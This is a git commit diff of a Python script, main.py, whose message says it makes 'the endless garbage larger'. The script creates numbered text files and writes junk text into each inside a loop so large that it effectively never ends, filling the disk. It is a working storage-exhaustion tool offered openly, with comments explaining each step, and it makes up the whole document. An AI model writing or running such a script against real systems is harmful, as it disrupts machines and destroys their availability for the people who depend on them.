10b77df5bdf9e05d31eb8b4b6a5f87724032819a
Vivolev <146621450+Vivolev@users.noreply.github.com>
2023-11-10 19:35:12 +0000

    Update main.py
    Made the endless garbage larger, added comments.

--- main.py
+++ main.py
@@ -1,7 +1,12 @@
-num_file = 0
-while True:
-    file = open(str(num_file) + '.txt', 'w')
-    for _control in range(1, 2**((4096*2)*1000000)):
-        file.write('hdhushdhsuhshau')
-    num_file += 1
-    file.close()
+num_file = 0 ## The number used to name the file ##
+num_copies = 1 ## Replace with number of copies you want (reccomended 1) ##
+while num_copies > 0:
+    file = open(f"{num_file}.txt", "w+") ## Opens a file, creates if non-existent ##
+    for num_control in range(1, 2**((4096*2)*1000000)):
+        file.write(f"""hdhushdhsuhshaulmvkjhjedjkdkjfdskajdhnajKSDXGHFJGRDJKKkdjyuisdcgftcydsufhdgsjh
+        ndgshsbvgahdyfjshgdfguijkdghdjksdgsjakdfgdsjakjsdksjdfhdjksfdsfhdsjkdfhsjkdfchyudxrhgyfh
+        dhgfcvcdjkfbgfdsjfndhjdfhyhgfuhgsyfhedufyhdjkffudisfjdghfdsyufgtrhjfngdhsyufhyd
+        hfudifhyudhfdfdgyhfdydgdfcyuhjdkhyugyugfydjh{num_control}djkffhdsdbsajfhdsnghkhfdsfgh""") ## Spams the file with endless garbage, making the file very large ##
+    num_file += 1 ## Increments the file number, ensuring the script functions properly with multiple copies. ##
+    num_copies -= 1
+    file.close() ## Closes the file because the script is done with it ##
